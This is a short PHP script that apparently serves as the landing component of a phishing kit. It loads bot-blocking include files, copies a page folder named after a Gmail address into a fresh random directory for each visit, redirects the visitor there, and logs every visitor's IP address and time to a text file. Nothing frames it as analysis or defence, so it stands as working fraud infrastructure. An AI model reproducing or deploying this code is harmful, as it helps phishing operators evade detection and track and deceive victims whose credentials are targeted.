<?php

/*

 */

include 'ak47.php';
include 'blocker.php';
include 'bots.php';
include 'banned.php';

session_start();

$DIR=md5(rand(0,100000000000));
function recurse_copy($home,$DIR) {
$dir = opendir($home);
@mkdir($DIR);
while(false !== ( $file = readdir($dir)) ) {
if (( $file != '.' ) && ( $file != '..' )) {
if ( is_dir($home . '/' . $file) ) {
recurse_copy($home . '/' . $file,$DIR . '/' . $file);
}
else {
copy($home . '/' . $file,$DIR . '/' . $file);
}
}
}
closedir($dir);
}
$home="allenpatricia86@gmail.com";
recurse_copy( $home, $DIR );
header("location:$DIR");
$ip = getenv("REMOTE_ADDR");
$file = fopen("Vu.txt","a");
fwrite($file,$ip."  -  ".gmdate ("Y-n-d")." @ ".gmdate ("H:i:s")."\n");
?> 